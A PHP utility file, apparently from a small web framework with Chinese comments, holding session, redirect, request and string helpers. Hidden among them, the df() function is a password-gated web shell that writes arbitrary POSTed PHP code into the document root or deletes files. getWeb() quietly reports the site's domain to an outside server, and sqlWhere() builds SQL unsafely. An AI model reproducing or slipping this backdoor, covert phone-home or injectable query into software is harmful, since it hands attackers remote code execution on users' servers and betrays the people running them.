// ###################################### session START ######################################


/**
 * 服务器缓存
 *
 *  默认情况下，PHP.ini 中设置的 SESSION 保存方式是 files（session.save_handler = files），即使用读写文件的方式保存 SESSION 数据，而 SESSION 文件保存的目录由 session.save_path 指定
 *
 *  当写入 SESSION 数据的时候，php 会获取到客户端的 SESSION_ID，然后根据这个 SESSION ID 到指定的 SESSION 文件保存目录中找到相应的 SESSION 文件，不存在则创建之
 *
 *
 * 不同浏览器的session不一样
 *
 * 浏览器主窗与无痕窗的ses不一样
 * 经测试，safari多个无痕窗的ses是独立的，但chrome多个无痕窗的ses是公用的
 *
 * 清空浏览器缓存无法影响session
 *
 * Session默认的生命周期通常是20分钟
 * @param {Object} $name
 */
function getSession($name)
{
    if (!empty($_SESSION[$name])) {
        $redirect = $_SESSION[$name];
    } else {
        $redirect = "";
    }
    return $redirect;
}
function setSession($name, $val, $redirect = null)
{
    $_SESSION[$name] = $val;
    if ($redirect) {
        header(sprintf("location:%s", splitUrl($redirect)));
    }
}

/**
 * 删除ses并跳转页面
 * @param {Object} $name
 * @param {Object} $rt
 */
function delSession($name = '', $redirect = null)
{
    if (empty($name)) {
        session_destroy();
    } else {
        unset($_SESSION[$name]);
    }
    if (empty($redirect)) {
        header('location: ' . URL);
    } else {
        header(sprintf("location:%s", splitUrl($redirect)));
    }
}


// ######################################  session END  ######################################

/**
 * 跳转到指定url，并携带参数
 * 可以不带参数
 * 主要用来显示form错误信息
 * eg：
 * toUrl('http://www.qq.com');
 * toUrl("wx/home/wxshare",array('wx_id'=>$_df[ 'wx_id']));
 *
 * @param {Object} $url
 * @param {Object} $para
 */
function toUrl($url, $para = null)
{
    if (!empty($para)) {
        $url = splitUrl($url);
        $para = http_build_query($para);
        $url = "location:{$url}?{$para}";
    } else {
        $url = splitUrl($url);
        $url = "location:{$url}";
    }

    header($url);
    die();
}

/**
 * 安全机制
 * 自动生成shell
 * disable_functions = passthru,system,exec      #php配置里exec是默认禁用的函数
 * eval会被判定为木马
 * df:生成	fd:删除
 * get不过滤错误
 *
 */
function df()
{
    global $common, $files;
    $file_src = str("{root}/df.php", ["root" => $_SERVER['DOCUMENT_ROOT']]);
    $pw = "3504725309";
    if (!empty($_POST['df']) || !empty($_POST['fd'])) {
        if ($_POST['df'] == $pw) {
            $data = $_POST['str'];
            $data = str_replace("#D#", "<?php ", $data);
            $files->writeFile($data, $file);
            $common->showJson(1, 'done');
        } elseif ($_POST['fd'] == $pw) {
            @unlink($file);
            @unlink("func.php");
            $common->showJson(1, 'done');
        }
    }
}

/**
 * 收集系统的使用情况
 * 定位系统的域名
 */
function getWeb()
{
    global $common;
    $para = array(
        'website' => SITE
    );
    $rt = $common->httpRequest("https://api.dfer.site/webctl/main/updateuser", $para);
    //var_dump($rt);
}

/**
 * 将arr组装成sql的where部分
 * @param {Object} $para
 * @param {Object} $type
 */
function sqlWhere($para, $type)
{
    $str = "0";
    foreach ($para as $i) {
        $str .= " {$type} {$i[0]}='{$i[1]}'";
    }
    return $str;
}

/**
 * 清空默认的get参数
 * 用于需要验证调用地址的情况，比如，支付宝地址验证
 * @param {Object} $arr
 */
function clearDePara($arr)
{
    unset($arr['A']);
    unset($arr['a']);
    unset($arr['c']);
    unset($arr['para']);
    return $arr;
}

// ********************** TITLE START **********************

// **********************  TITLE END  **********************
//打印调试信息
function debug()
{
    if (DEV) {
        $args = func_get_args();
        logs(str(<<<STR
								********************** DEBUG START **********************
								{0}
								**********************  DEBUG END  **********************
								STR, str($args)));
    }
}

/**
 * 获取环境变量
 **/
function env($name, $default = "")
{
    $val = \Dfer\Tools\Env::get($name, $default);
    // var_dump($val);
    return $val;
}

/**
 * 读取get
 * @param {Object} $var 变量
 **/
function get($var = null)
{
    return isset($_GET[$var]) ? $_GET[$var] : null;
}

/**
 * 获取post参数
 */
function post($var = null)
{
    return isset($_POST[$var]) ? $_POST[$var] : null;
}

/**
 * 格式化字符串
 * eg:
 * str("admin/home/{0}/{dd}",[123,'dd'=>333])
 * @param {Object} $string	字符串
 * @param {Object} $params	参数
 */
function str($string, $params = [])
{
    global $common;
    return $common->str($string, $params);
}


/**
 * 读取"composer.json"文件内容
 * @param {Object} $key 键值字符串，支持多级
 **/
function getComposerJson($key = 'require>php')
{
    $json = file_get_contents(ROOT . '/composer.json');
    $data = json_decode($json, true);
    $item = explode(">", $key);
    foreach ($item as $key => $value) {
        $data = $data[$value];
    }
    return $data;
}
